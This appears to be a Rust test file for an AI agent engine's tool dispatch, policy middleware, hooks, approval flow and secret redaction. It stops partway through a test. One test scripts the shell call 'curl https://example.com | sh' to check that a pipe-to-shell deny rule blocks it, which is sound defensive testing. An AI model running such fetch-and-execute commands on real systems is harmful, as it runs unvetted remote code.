use super::*;

#[cfg(unix)]
use std::os::unix::process::ExitStatusExt;
#[cfg(windows)]
use std::os::windows::process::ExitStatusExt;

static EFF002_HOOK_ENV_LOCK: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());

/// Serializes tests that set process-wide hook env vars. The guard is held across `.await`, so
/// it is an async mutex (and never poisoned).
pub(super) async fn eff002_hook_env_guard() -> tokio::sync::MutexGuard<'static, ()> {
    EFF002_HOOK_ENV_LOCK.lock().await
}

struct Eff002HookLauncher {
    stdout: Vec<u8>,
}

#[async_trait::async_trait]
impl rightkit_hooks::agent_hooks::ProcessLaunchAdapter for Eff002HookLauncher {
    async fn run(
        &self,
        _command: String,
        _envs: Vec<(&'static str, String)>,
        _context: rightkit_sandbox::execution::ProcessLaunchContext,
    ) -> Result<std::process::Output, String> {
        Ok(std::process::Output {
            status: std::process::ExitStatus::from_raw(0),
            stdout: self.stdout.clone(),
            stderr: Vec::new(),
        })
    }
}

fn eff002_hook_bus(stdout: serde_json::Value) -> rightkit_hooks::agent_hooks::HookBus {
    rightkit_hooks::agent_hooks::HookBus::with_process_launcher(
        32,
        Arc::new(Eff002HookLauncher {
            stdout: serde_json::to_vec(&stdout).unwrap(),
        }),
        rightkit_sandbox::execution::ProcessLaunchContext {
            workspace_root: std::env::current_dir()
                .unwrap_or_default()
                .display()
                .to_string(),
            sandbox_profile: None,
            sandbox_required: false,
            network_required: false,
        },
    )
}

#[tokio::test]
async fn plain_response_completes() {
    let (mut e, _c) = engine_with(
        vec![LlmResponse::text("done").with_tokens(10, 2)],
        PermissionMode::Bypass,
    );
    let out = e.submit_user_message("hi").await.unwrap();
    assert_eq!(out, "done");
    assert_eq!(e.usage().prompt_tokens, 10);
}

#[tokio::test]
async fn tool_call_then_completion() {
    let call = ToolCall {
        id: "tc1".into(),
        name: "shell".into(),
        arguments_json: serde_json::json!({"command": "echo hi"}).to_string(),
    };
    let (mut e, _c) = engine_with(
        vec![
            LlmResponse::default().with_tool_call(call),
            LlmResponse::text("finished"),
        ],
        PermissionMode::Bypass,
    );
    let out = e.submit_user_message("run echo").await.unwrap();
    assert_eq!(out, "finished");
    let has_tool = e.transcript().messages().iter().any(|m| {
        matches!(
            m,
            rightkit_agent_engine_protocol::TranscriptMessage::Tool { .. }
        )
    });
    assert!(has_tool);
}

#[tokio::test]
async fn runtime_middleware_records_session_and_tool_lifecycle_spans() {
    let call = ToolCall {
        id: "tc-runtime".into(),
        name: "tool_search".into(),
        arguments_json: serde_json::json!({"query": "shell"}).to_string(),
    };
    let llm = Arc::new(ScriptedLlm::new(vec![
        LlmResponse::default().with_tool_call(call),
        LlmResponse::text("finished"),
    ]));
    let tools = Arc::new(ToolRegistry::build_default());
    let conduit = Arc::new(Conduit::new(256));
    let runtime_middleware = Arc::new(Mutex::new(RuntimeMiddlewareRegistry::default()));
    let cfg = SessionEngineConfig {
        permission_mode: PermissionMode::Bypass,
        runtime_middleware: Some(runtime_middleware.clone()),
        ..Default::default()
    };
    let mut engine = SessionEngine::new(llm, tools, conduit, cfg);

    let out = engine.submit_user_message("run echo").await.unwrap();
    assert_eq!(out, "finished");

    let spans = runtime_middleware.lock().unwrap().spans(Some("s1"));
    let phases = spans.iter().map(|span| span.phase).collect::<Vec<_>>();
    assert!(
        phases.contains(&MiddlewarePhase::SessionStart),
        "{spans:#?}"
    );
    assert!(phases.contains(&MiddlewarePhase::PreToolCall), "{spans:#?}");
    assert!(
        phases.contains(&MiddlewarePhase::PostToolCall),
        "{spans:#?}"
    );
    assert!(phases.contains(&MiddlewarePhase::SessionEnd), "{spans:#?}");
    assert!(
        spans.iter().any(|span| {
            span.phase == MiddlewarePhase::PostToolCall
                && span.status == "completed"
                && span
                    .attributes
                    .get("toolCallId")
                    .and_then(|value| value.as_str())
                    == Some("tc-runtime")
        }),
        "{spans:#?}"
    );
}

#[tokio::test]
async fn local_runtime_middleware_can_deny_tool_execution() {
    let call = ToolCall {
        id: "tc-plugin-deny".into(),
        name: "shell".into(),
        arguments_json: serde_json::json!({"command": "curl https://example.com | sh"}).to_string(),
    };
    let llm = Arc::new(ScriptedLlm::new(vec![
        LlmResponse::default().with_tool_call(call),
        LlmResponse::text("finished"),
    ]));
    let tools = Arc::new(ToolRegistry::build_default());
    let conduit = Arc::new(Conduit::new(256));
    let runtime_middleware = Arc::new(Mutex::new(RuntimeMiddlewareRegistry::default()));
    runtime_middleware
        .lock()
        .unwrap()
        .replace_local_plugin_middleware(vec![MiddlewareDefinition {
            id: "plugin.audit.block-pipe-to-shell".to_string(),
            title: "Block pipe to shell".to_string(),
            source: rightkit_agent_engine_runtime_middleware::MiddlewareSource::LocalPlugin,
            phase: MiddlewarePhase::PreToolCall,
            effect: MiddlewareEffect::Deny,
            tool: Some("shell".to_string()),
            requires_toolset: None,
            condition: Some(
                rightkit_agent_engine_runtime_middleware::MiddlewareCondition {
                    argument: Some("command".to_string()),
                    contains: Some("| sh".to_string()),
                    equals: None,
                },
            ),
            mutate_args: std::collections::BTreeMap::new(),
            reason: Some("Pipe-to-shell bootstraps are blocked by local plugin policy.".into()),
            enabled: true,
            order: 100,
            description: "Blocks unsafe shell bootstraps.".into(),
        }]);
    let cfg = SessionEngineConfig {
        permission_mode: PermissionMode::Bypass,
        runtime_middleware: Some(runtime_middleware.clone()),
        ..Default::default()
    };
    let mut engine = SessionEngine::new(llm, tools, conduit, cfg);

    let out = engine
        .submit_user_message("run unsafe shell")
        .await
        .unwrap();
    assert_eq!(out, "finished");
    let denied = engine.transcript().messages().iter().any(|message| {
        matches!(
            message,
            TranscriptMessage::Tool { summary, is_error: true, .. }
                if summary.contains("runtime middleware denied")
                    && summary.contains("plugin.audit.block-pipe-to-shell")
        )
    });
    assert!(denied, "{:#?}", engine.transcript().messages());
    let spans = runtime_middleware.lock().unwrap().spans(Some("s1"));
    assert!(spans.iter().any(|span| {
        span.phase == MiddlewarePhase::PostToolCall
            && span.status == "denied"
            && span.attributes["middlewareId"] == "plugin.audit.block-pipe-to-shell"
    }));
}

// CR-07: `parallel_write_prefix` and the path-disjoint concurrent-write
// batch it fed (engine_loop_dispatch.rs) were removed — path-prefix
// disjointness is not a sufficient transaction boundary (symlinks,
// case-folding, generated files, hooks, shared indexes, process-global
// state, and multi-file invariants can still overlap), so every mutating
// tool now executes strictly serially. The `write_call` /
// `begin_unrestricted_assurance_task` helpers and the two tests that
// exercised the removed function (`parallel_write_prefix_only_groups_
// disjoint_auto_allowed_writes`, `parallel_write_prefix_truncates_at_
// first_assurance_denial_not_whole_batch`) were removed with it. The
// no-temporal-overlap replacement lives in
// `engine_tool_dispatch.rs::disjoint_path_mutations_never_overlap_in_time`.

#[test]
fn lexical_path_key_merges_same_file_variants() {
    let root = std::path::Path::new("D:/proj");
    // ./prefix, plain relative, and a no-op .. round-trip all resolve equal.
    let a = lexical_path_key(root, "src/a.rs");
    assert_eq!(a, lexical_path_key(root, "./src/a.rs"));
    assert_eq!(a, lexical_path_key(root, "src/sub/../a.rs"));
    // Case-only differences must NOT look disjoint (case-insensitive FS).
    assert_eq!(a, lexical_path_key(root, "src/A.rs"));
    // Distinct files produce distinct keys (safe to parallelize).
    assert_ne!(a, lexical_path_key(root, "src/b.rs"));
}

#[test]
fn parse_tool_arguments_accepts_valid_and_empty() {
    let (v, err) = parse_tool_arguments(r#"{"path":"a.rs"}"#, None);
    assert!(err.is_none());
    assert_eq!(v["path"], "a.rs");

    // Empty / whitespace is a legitimate no-arg call, not an error.
    let (v, err) = parse_tool_arguments("   ", None);
    assert!(err.is_none());
    assert!(v.is_null());
}

#[test]
fn parse_tool_arguments_rejects_malformed_and_echoes_schema() {
    let schema = serde_json::json!({"type":"object","properties":{"path":{"type":"string"}}});
    let (v, err) = parse_tool_arguments(r#"{"path": "unterminated"#, Some(&schema));
    assert!(
        v.is_null(),
        "malformed args must not coerce to a usable value"
    );
    let err = err.expect("malformed JSON must produce a structured error");
    assert!(err.contains("Invalid tool arguments"));
    assert!(err.contains("Expected input schema"));
    assert!(
        err.contains("\"path\""),
        "schema hint should be echoed back"
    );
}

#[test]
fn parse_tool_arguments_attributed_records_repairs_and_failures() {
    rightkit_logs::agent_telemetry::reset_repair_telemetry();
    let schema = serde_json::json!({"type":"object","properties":{"paths":{"type":"array"}}});
    let attribution = (
        Some("openrouter".to_string()),
        Some("test/model".to_string()),
    );

    // Successful deterministic repair (singleton → array) with attribution.
    let (value, err) = parse_tool_arguments_attributed(
        r#"{"paths":"only"}"#,
        Some(&schema),
        Some("read_files"),
        Some(&attribution),
    );
    // "only" is a string, schema wants array → wrapped; then item repair
    // against `items` (absent) leaves the string — still a recorded repair.
    assert!(err.is_none());
    assert!(value["paths"].is_array() || value["paths"].is_string());
    let counters = rightkit_logs::agent_telemetry::repair_counters();
    let repair_row = counters
        .iter()
        .find(|row| row.success && row.tool.as_deref() == Some("read_files"))
        .expect("successful repair recorded with tool attribution");
    assert_eq!(repair_row.provider.as_deref(), Some("openrouter"));
    assert_eq!(repair_row.model.as_deref(), Some("test/model"));
    assert!(repair_row.repair_kind.is_some());

    // Validation failure records a bounded error kind, success=false.
    let bad_schema = serde_json::json!({"type":"object","properties":{"path":{"type":"string"}},"required":["path"]});
    let (_, err) = parse_tool_arguments_attributed(
        r#"{"other":1}"#,
        Some(&bad_schema),
        Some("write_file"),
        Some(&attribution),
    );
    assert!(err.is_some());
    let counters = rightkit_logs::agent_telemetry::repair_counters();
    assert!(counters.iter().any(|row| !row.success
        && row.tool.as_deref() == Some("write_file")
        && row.validator_error.is_some()));

    // Malformed JSON records not_valid_json.
    let (_, err) = parse_tool_arguments_attributed(
        r#"{"path": "unterminated"#,
        Some(&schema),
        Some("read_file"),
        Some(&attribution),
    );
    assert!(err.is_some());
    let counters = rightkit_logs::agent_telemetry::repair_counters();
    assert!(counters.iter().any(|row| !row.success
        && row.tool.as_deref() == Some("read_file")
        && row.validator_error.as_deref() == Some("not_valid_json")));

    rightkit_logs::agent_telemetry::reset_repair_telemetry();
}

#[test]
fn local_runtime_middleware_mutates_args_with_redacted_decision_metadata() {
    let mut call = ToolCall {
        id: "tc-plugin-mutate".into(),
        name: "shell".into(),
        arguments_json: serde_json::json!({"command": "should-not-run"}).to_string(),
    };
    let runtime_middleware = Arc::new(Mutex::new(RuntimeMiddlewareRegistry::default()));
    let mut mutate_args = std::collections::BTreeMap::new();
    mutate_args.insert(
        "command".to_string(),
        serde_json::Value::String("middleware-mutated".to_string()),
    );
    runtime_middleware
        .lock()
        .unwrap()
        .replace_local_plugin_middleware(vec![MiddlewareDefinition {
            id: "plugin.audit.normalize-shell".to_string(),
            title: "Normalize shell".to_string(),
            source: rightkit_agent_engine_runtime_middleware::MiddlewareSource::LocalPlugin,
            phase: MiddlewarePhase::PreToolCall,
            effect: MiddlewareEffect::MutateArgs,
            tool: Some("shell".to_string()),
            requires_toolset: None,
            condition: None,
            mutate_args,
            reason: Some("Normalize shell command for policy test.".into()),
            enabled: true,
            order: 100,
            description: "Rewrites shell command.".into(),
        }]);
    let llm = Arc::new(ScriptedLlm::new(vec![]));
    let tools = Arc::new(ToolRegistry::build_default());
    let conduit = Arc::new(Conduit::new(256));
    let cfg = SessionEngineConfig {
        permission_mode: PermissionMode::Bypass,
        runtime_middleware: Some(runtime_middleware.clone()),
        ..Default::default()
    };
    let engine = SessionEngine::new(llm, tools, conduit, cfg);

    let decisions = engine.apply_pre_tool_middleware(&mut call);
    let mutated_args: serde_json::Value = serde_json::from_str(&call.arguments_json).unwrap();

    assert_eq!(mutated_args["command"], "middleware-mutated");
    assert_eq!(decisions.len(), 1);
    assert_eq!(decisions[0].middleware_id, "plugin.audit.normalize-shell");
    assert_eq!(decisions[0].mutated_arg_keys, vec!["command"]);
    let rendered = format!("{:?}", decisions[0]);
    assert!(rendered.contains("mutated_arg_keys"), "{rendered}");
    assert!(rendered.contains("command"), "{rendered}");
    assert!(!rendered.contains("should-not-run"), "{rendered}");
    assert!(!rendered.contains("middleware-mutated"), "{rendered}");
}

#[test]
fn eff002_final_policy_evaluates_after_argument_transform() {
    let mut call = ToolCall {
        id: "tc-eff002-policy".into(),
        name: "shell".into(),
        arguments_json: serde_json::json!({"command":"safe"}).to_string(),
    };
    let runtime_middleware = Arc::new(Mutex::new(RuntimeMiddlewareRegistry::default()));
    runtime_middleware
        .lock()
        .unwrap()
        .replace_local_plugin_middleware(vec![
            MiddlewareDefinition {
                id: "plugin.eff002-transform".into(),
                title: "Transform".into(),
                source: rightkit_agent_engine_runtime_middleware::MiddlewareSource::LocalPlugin,
                phase: MiddlewarePhase::PreToolCall,
                effect: MiddlewareEffect::MutateArgs,
                tool: Some("shell".into()),
                requires_toolset: None,
                condition: None,
                mutate_args: [("command".into(), serde_json::json!("blocked"))]
                    .into_iter()
                    .collect(),
                reason: None,
                enabled: true,
                order: 1,
                description: "test".into(),
            },
            MiddlewareDefinition {
                id: "plugin.eff002-deny".into(),
                title: "Deny".into(),
                source: rightkit_agent_engine_runtime_middleware::MiddlewareSource::LocalPlugin,
                phase: MiddlewarePhase::PreToolCall,
                effect: MiddlewareEffect::Deny,
                tool: Some("shell".into()),
                requires_toolset: None,
                condition: Some(
                    rightkit_agent_engine_runtime_middleware::MiddlewareCondition {
                        argument: Some("command".into()),
                        equals: Some(serde_json::json!("blocked")),
                        contains: None,
                    },
                ),
                mutate_args: Default::default(),
                reason: Some("blocked".into()),
                enabled: true,
                order: 2,
                description: "test".into(),
            },
        ]);
    let engine = SessionEngine::new(
        Arc::new(ScriptedLlm::new(vec![])),
        Arc::new(ToolRegistry::build_default()),
        Arc::new(Conduit::new(8)),
        SessionEngineConfig {
            runtime_middleware: Some(runtime_middleware),
            ..Default::default()
        },
    );
    let transforms = engine.apply_pre_tool_arg_transforms(&mut call);
    let policy = engine.evaluate_pre_tool_policy(&call);
    assert_eq!(transforms.len(), 1);
    assert!(policy
        .iter()
        .any(|d| matches!(d.action, AppliedMiddlewareAction::Deny)));
    assert_eq!(
        serde_json::from_str::<serde_json::Value>(&call.arguments_json).unwrap()["command"],
        "blocked"
    );
}

#[test]
fn eff002_digest_stable_and_secret_free_for_retry() {
    let a = serde_json::json!({"command":"echo hi", "token":"secret-value"});
    let b = serde_json::json!({"token":"secret-value", "command":"echo hi"});
    let first = crate::tool_dispatch_plumbing::effect_payload_digest("shell", &a);
    assert_eq!(
        first,
        crate::tool_dispatch_plumbing::effect_payload_digest("shell", &b)
    );
    assert!(!first.contains("secret-value"));
}

#[tokio::test]
async fn external_dispatch_rebinds_missing_or_foreign_assurance_but_preserves_current_contract() {
    for (prior_session, expected_task) in [
        (None, None),
        (Some("foreign-session"), None),
        (Some("current-session"), Some("existing-current-task")),
    ] {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("proof.txt");
        std::fs::write(&file, "assurance proof").unwrap();
        let broker = Arc::new(Mutex::new(
            crate::assurance_broker::AssuranceBroker::open(dir.path().join("broker.jsonl"))
                .unwrap(),
        ));
        if let Some(session_id) = prior_session {
            broker
                .lock()
                .unwrap()
                .begin_task(
                    session_id,
                    if session_id == "current-session" {
                        "existing-current-task"
                    } else {
                        "foreign-task"
                    },
                    "existing-trace",
                    "existing request",
                    vec![dir.path().to_string_lossy().into_owned()],
                    Vec::new(),
                )
                .unwrap();
        }

        let mut engine = SessionEngine::new(
            Arc::new(ScriptedLlm::new(vec![])),
            Arc::new(ToolRegistry::build_default()),
            Arc::new(Conduit::new(64)),
            SessionEngineConfig {
                session_id: "current-session".into(),
                workspace_root: dir.path().to_path_buf(),
                permission_mode: PermissionMode::Bypass,
                ..Default::default()
            },
        );
        engine.set_assurance_broker(Arc::clone(&broker));
        let call_id = format!("external-{}", prior_session.unwrap_or("missing"));
        let result = engine
            .dispatch_external_tool_call(ToolCall {
                id: call_id.clone(),
                name: "read_file".into(),
                arguments_json: serde_json::json!({"path": file}).to_string(),
            })
            .await;

        assert!(
            !result.is_error,
            "real read_file dispatch failed: {result:?}"
        );
        assert!(result.content.contains("assurance proof"));
        let broker = broker.lock().unwrap();
        let contract = broker.contract().expect("current contract");
        assert_eq!(contract.session_id, "current-session");
        if let Some(expected_task) = expected_task {
            assert_eq!(contract.task_id, expected_task);
        } else {
            assert_eq!(
                contract.task_id,
                format!("current-session--external--{call_id}")
            );
        }
        assert!(
            broker.receipt(&call_id).is_some(),
            "governed dispatch must issue host receipt"
        );
    }
}

#[tokio::test]
async fn eff002_hook_transform_then_middleware_deny_has_zero_origin() {
    let _guard = eff002_hook_env_guard().await;
    std::env::set_var(
        "RIGHTKIT_HOOKS_JSON",
        r#"{"PreToolUse":[{"command":"fixture"}]}"#,
    );
    let middleware = Arc::new(Mutex::new(RuntimeMiddlewareRegistry::default()));
    middleware
        .lock()
        .unwrap()
        .replace_local_plugin_middleware(vec![MiddlewareDefinition {
            id: "plugin.eff002-deny-effective".into(),
            title: "Deny effective command".into(),
            source: rightkit_agent_engine_runtime_middleware::MiddlewareSource::LocalPlugin,
            phase: MiddlewarePhase::PreToolCall,
            effect: MiddlewareEffect::Deny,
            tool: Some("shell".into()),
            requires_toolset: None,
            condition: Some(
                rightkit_agent_engine_runtime_middleware::MiddlewareCondition {
                    argument: Some("command".into()),
                    equals: Some(serde_json::json!("blocked")),
                    contains: None,
                },
            ),
            mutate_args: Default::default(),
            reason: Some("effective command is blocked".into()),
            enabled: true,
            order: 1,
            description: "test".into(),
        }]);
    let conduit = Arc::new(Conduit::new(64));
    let mut engine = SessionEngine::new(
        Arc::new(ScriptedLlm::new(vec![])),
        Arc::new(ToolRegistry::build_default()),
        conduit.clone(),
        SessionEngineConfig {
            permission_mode: PermissionMode::Bypass,
            runtime_middleware: Some(middleware),
            ..Default::default()
        },
    );
    engine.hook_bus = Some(eff002_hook_bus(serde_json::json!({
        "schemaVersion": 1,
        "action": "transform",
        "arguments": {"command": "blocked"}
    })));

    let result = engine
        .dispatch_external_tool_call(ToolCall {
            id: "tc-eff002-deny".into(),
            name: "shell".into(),
            arguments_json: serde_json::json!({"command":"safe"}).to_string(),
        })
        .await;
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");

    assert!(
        result.is_error,
        "effective middleware denial must stop dispatch"
    );
    let events = conduit.events_after(0);
    assert!(!events.iter().any(|event| matches!(
        event,
        ProtocolEvent::ToolCallStarted { .. } | ProtocolEvent::ToolApprovalRequested { .. }
    )));
}

#[tokio::test]
async fn eff002_hook_transform_invalid_has_zero_origin_or_effect() {
    let _guard = eff002_hook_env_guard().await;
    std::env::set_var(
        "RIGHTKIT_HOOKS_JSON",
        r#"{"PreToolUse":[{"command":"fixture"}]}"#,
    );
    let conduit = Arc::new(Conduit::new(64));
    let mut engine = SessionEngine::new(
        Arc::new(ScriptedLlm::new(vec![])),
        Arc::new(ToolRegistry::build_default()),
        conduit.clone(),
        SessionEngineConfig {
            permission_mode: PermissionMode::Ask,
            ..Default::default()
        },
    );
    engine.hook_bus = Some(eff002_hook_bus(serde_json::json!({
        "schemaVersion": 1,
        "action": "transform",
        "arguments": {}
    })));

    let result = engine
        .dispatch_external_tool_call(ToolCall {
            id: "tc-eff002-invalid".into(),
            name: "read_file".into(),
            arguments_json: serde_json::json!({"path":"original.txt"}).to_string(),
        })
        .await;
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");

    assert!(result.is_error);
    let events = conduit.events_after(0);
    assert!(!events.iter().any(|event| matches!(
        event,
        ProtocolEvent::ToolCallStarted { .. } | ProtocolEvent::ToolApprovalRequested { .. }
    )));
}

#[tokio::test]
async fn eff002_hook_transform_then_middleware_approval_binds_final_digest() {
    let _guard = eff002_hook_env_guard().await;
    std::env::set_var(
        "RIGHTKIT_HOOKS_JSON",
        r#"{"PreToolUse":[{"command":"fixture"}]}"#,
    );
    let file = tempfile::NamedTempFile::new().unwrap();
    std::fs::write(file.path(), "effective payload").unwrap();
    let final_path = file.path().to_string_lossy().to_string();
    let middleware = Arc::new(Mutex::new(RuntimeMiddlewareRegistry::default()));
    middleware
        .lock()
        .unwrap()
        .replace_local_plugin_middleware(vec![MiddlewareDefinition {
            id: "plugin.eff002-approval-effective".into(),
            title: "Approve effective path".into(),
            source: rightkit_agent_engine_runtime_middleware::MiddlewareSource::LocalPlugin,
            phase: MiddlewarePhase::PreToolCall,
            effect: MiddlewareEffect::RequireApproval,
            tool: Some("read_file".into()),
            requires_toolset: None,
            condition: Some(
                rightkit_agent_engine_runtime_middleware::MiddlewareCondition {
                    argument: Some("path".into()),
                    equals: Some(serde_json::json!(final_path.clone())),
                    contains: None,
                },
            ),
            mutate_args: Default::default(),
            reason: Some("effective path requires approval".into()),
            enabled: true,
            order: 1,
            description: "test".into(),
        }]);
    let conduit = Arc::new(Conduit::new(64));
    let mut engine = SessionEngine::new(
        Arc::new(ScriptedLlm::new(vec![])),
        Arc::new(ToolRegistry::build_default()),
        conduit.clone(),
        SessionEngineConfig {
            permission_mode: PermissionMode::Bypass,
            runtime_middleware: Some(middleware.clone()),
            workspace_root: file.path().parent().unwrap().to_path_buf(),
            ..Default::default()
        },
    );
    engine.hook_bus = Some(eff002_hook_bus(serde_json::json!({
        "schemaVersion": 1,
        "action": "transform",
        "arguments": {"path": final_path}
    })));
    let approvals = engine.pending_approvals.clone();
    let mut subscription = conduit.subscribe_human();
    let task = tokio::spawn(async move {
        engine
            .dispatch_external_tool_call(ToolCall {
                id: "tc-eff002-approval".into(),
                name: "read_file".into(),
                arguments_json: serde_json::json!({"path":"original.txt"}).to_string(),
            })
            .await
    });
    let expected_args = serde_json::json!({"path": file.path().to_string_lossy()});
    let expected_digest =
        crate::tool_dispatch_plumbing::effect_payload_digest("read_file", &expected_args);
    loop {
        match tokio::time::timeout(std::time::Duration::from_secs(5), subscription.recv())
            .await
            .unwrap()
        {
            crate::conduit::ConduitReceive::Event(ProtocolEvent::ToolApprovalRequested {
                call,
                ..
            }) => {
                assert_eq!(call.arguments_json, expected_args.to_string());
                let sender = approvals.lock().unwrap().remove(&call.id).unwrap();
                sender.send(true).unwrap();
                break;
            }
            crate::conduit::ConduitReceive::Event(_) => {}
            crate::conduit::ConduitReceive::Lagged { .. } => continue,
            crate::conduit::ConduitReceive::Closed => {
                panic!("approval conduit closed before request")
            }
        }
    }
    let result = task.await.unwrap();
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");
    assert!(!result.is_error, "approved effective read should execute");
    assert!(
        result.content.contains("effective payload"),
        "approved effective read must include transformed payload: {}",
        result.content
    );
    let spans = middleware.lock().unwrap().spans(Some("s1"));
    assert!(spans.iter().any(|span| {
        span.phase == MiddlewarePhase::ApprovalRequested
            && span.attributes.get("effectPayloadDigest")
                == Some(&serde_json::json!(expected_digest))
    }));
}

#[tokio::test]
async fn eff002_hook_transform_recomputes_skill_policy_on_effective_call() {
    let _guard = eff002_hook_env_guard().await;
    std::env::set_var(
        "RIGHTKIT_HOOKS_JSON",
        r#"{"PreToolUse":[{"command":"fixture"}]}"#,
    );
    let tmp = tempfile::tempdir().unwrap();
    let skills_dir = tmp.path().join("skills");
    std::fs::create_dir_all(&skills_dir).unwrap();
    std::fs::write(
        skills_dir.join("blocked.md"),
        "+++\nname = \"blocked\"\ndescription = \"Block transformed paths.\"\ntrigger = \"event == \\\"PreToolUse\\\" and file_path matches \\\"*.blocked\\\"\"\nenabled = true\n[effects]\ndisallowedTools = [\"read_file\"]\n+++\n",
    )
    .unwrap();
    let conduit = Arc::new(Conduit::new(64));
    let mut engine = SessionEngine::new(
        Arc::new(ScriptedLlm::new(vec![])),
        Arc::new(ToolRegistry::build_default()),
        conduit.clone(),
        SessionEngineConfig {
            permission_mode: PermissionMode::Bypass,
            workspace_root: tmp.path().to_path_buf(),
            skill_dirs: vec![skills_dir],
            ..Default::default()
        },
    );
    engine.hook_bus = Some(eff002_hook_bus(serde_json::json!({
        "schemaVersion": 1,
        "action": "transform",
        "arguments": {"path": "blocked.blocked"}
    })));

    let result = engine
        .dispatch_external_tool_call(ToolCall {
            id: "tc-eff002-skill".into(),
            name: "read_file".into(),
            arguments_json: serde_json::json!({"path":"safe.txt"}).to_string(),
        })
        .await;
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");

    assert!(result.is_error);
    assert!(
        result.content.contains("skill effect denied"),
        "{}",
        result.content
    );
    assert!(!conduit.events_after(0).iter().any(|event| matches!(
        event,
        ProtocolEvent::ToolCallStarted { .. } | ProtocolEvent::ToolApprovalRequested { .. }
    )));
}

#[test]
fn eff002_hook_presence_disables_readonly_fast_path() {
    let mut engine = SessionEngine::new(
        Arc::new(ScriptedLlm::new(vec![])),
        Arc::new(ToolRegistry::build_default()),
        Arc::new(Conduit::new(8)),
        SessionEngineConfig {
            permission_mode: PermissionMode::Bypass,
            ..Default::default()
        },
    );
    engine.hook_bus = Some(rightkit_hooks::agent_hooks::HookBus::default());
    let call = ToolCall {
        id: "tc-eff002-fast".into(),
        name: "read_file".into(),
        arguments_json: serde_json::json!({"path":"safe.txt"}).to_string(),
    };
    let call_ref = &call;
    assert!(!engine.can_dispatch_readonly_fast(&call_ref));
}

#[tokio::test]
async fn eff002_concurrent_consumer_returns_effective_transformed_call() {
    let _guard = eff002_hook_env_guard().await;
    std::env::set_var(
        "RIGHTKIT_HOOKS_JSON",
        r#"{"PreToolUse":[{"command":"fixture"}]}"#,
    );
    let mut engine = SessionEngine::new(
        Arc::new(ScriptedLlm::new(vec![])),
        Arc::new(ToolRegistry::build_default()),
        Arc::new(Conduit::new(8)),
        SessionEngineConfig {
            permission_mode: PermissionMode::Bypass,
            ..Default::default()
        },
    );
    engine.hook_bus = Some(eff002_hook_bus(serde_json::json!({
        "schemaVersion": 1,
        "action": "transform",
        "arguments": {"value": "effective"}
    })));
    let (effective_call, result) = engine
        .streaming_concurrent_tool_future(ToolCall {
            id: "tc-eff002-concurrent".into(),
            name: "unknown_eff002_tool".into(),
            arguments_json: serde_json::json!({"value":"original"}).to_string(),
        })
        .await;
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");
    assert_eq!(effective_call.arguments_json, r#"{"value":"effective"}"#);
    assert!(result.is_error);
}

#[tokio::test]
async fn eff002_approval_runtime_evidence_excludes_secret_argument() {
    let secret = "EFF002_UNIQUE_RUNTIME_SECRET_7f3c";
    let args = serde_json::json!({"command": format!("printf {secret}")});
    let call = ToolCall {
        id: "tc-eff002-private-span".into(),
        name: "shell".into(),
        arguments_json: args.to_string(),
    };
    let runtime_middleware = Arc::new(Mutex::new(RuntimeMiddlewareRegistry::default()));
    let conduit = Arc::new(Conduit::new(256));
    let mut engine = SessionEngine::new(
        Arc::new(ScriptedLlm::new(vec![
            LlmResponse::default().with_tool_call(call.clone()),
            LlmResponse::text("done"),
        ])),
        Arc::new(ToolRegistry::build_default()),
        conduit.clone(),
        SessionEngineConfig {
            permission_mode: PermissionMode::Ask,
            runtime_middleware: Some(runtime_middleware.clone()),
            ..Default::default()
        },
    );
    let approvals = engine.pending_approvals.clone();
    let mut subscription = conduit.subscribe_human();
    let task = tokio::spawn(async move { engine.submit_user_message("run command").await });

    tokio::time::timeout(std::time::Duration::from_secs(10), async {
        loop {
            match subscription.recv().await {
                crate::conduit::ConduitReceive::Event(ProtocolEvent::ToolApprovalRequested {
                    call,
                    ..
                }) => {
                    assert_eq!(call.id, "tc-eff002-private-span");
                    approvals
                        .lock()
                        .unwrap()
                        .remove(&call.id)
                        .expect("approval sender")
                        .send(true)
                        .unwrap();
                    break;
                }
                crate::conduit::ConduitReceive::Closed => panic!("approval conduit closed"),
                _ => {}
            }
        }
    })
    .await
    .expect("timed out waiting for approval");
    task.await.unwrap().unwrap();

    let spans = runtime_middleware.lock().unwrap().spans(Some("s1"));
    let serialized = serde_json::to_string(&spans).unwrap();
    assert!(
        !serialized.contains(secret),
        "runtime evidence leaked secret: {serialized}"
    );
    let expected_digest = crate::tool_dispatch_plumbing::effect_payload_digest("shell", &args);
    let approval_span = spans
        .iter()
        .find(|span| span.phase == MiddlewarePhase::ApprovalRequested)
        .expect("approval runtime span");
    assert_eq!(approval_span.attributes["toolCallId"], call.id);
    assert_eq!(
        approval_span.attributes["effectPayloadDigest"],
        expected_digest
    );
    assert!(approval_span
        .attributes
        .get("permissionGateRequest")
        .is_none());
    let gate_decision = approval_span
        .attributes
        .get("permissionGateDecision")
        .expect("approval decision metadata");
    assert_eq!(
        approval_span.attributes["correlation"],
        gate_decision["requestId"]
    );
}

// ---------------------------------------------------------------------------
// Hook wiring: Ask approval, additionalContext, lifecycle events, blocking
// UserPromptSubmit / Stop / SubagentStop.
// ---------------------------------------------------------------------------

fn transcript_json(engine: &SessionEngine) -> String {
    serde_json::to_string(&engine.transcript.messages()).unwrap()
}

#[tokio::test]
async fn hook_ask_routes_through_approval_with_post_mutation_payload() {
    let _guard = eff002_hook_env_guard().await;
    std::env::set_var(
        "RIGHTKIT_HOOKS_JSON",
        r#"{"PreToolUse":[{"command":"fixture"}]}"#,
    );
    let file = tempfile::NamedTempFile::new().unwrap();
    std::fs::write(file.path(), "ask payload").unwrap();
    let final_path = file.path().to_string_lossy().to_string();
    let conduit = Arc::new(Conduit::new(64));
    let mut engine = SessionEngine::new(
        Arc::new(ScriptedLlm::new(vec![])),
        Arc::new(ToolRegistry::build_default()),
        conduit.clone(),
        SessionEngineConfig {
            permission_mode: PermissionMode::Bypass,
            workspace_root: file.path().parent().unwrap().to_path_buf(),
            ..Default::default()
        },
    );
    engine.hook_bus = Some(eff002_hook_bus(serde_json::json!({
        "decision": "ask",
        "reason": "confirm read",
        "updatedInput": {"path": final_path}
    })));
    let approvals = engine.pending_approvals.clone();
    let mut subscription = conduit.subscribe_human();
    let task = tokio::spawn(async move {
        engine
            .dispatch_external_tool_call(ToolCall {
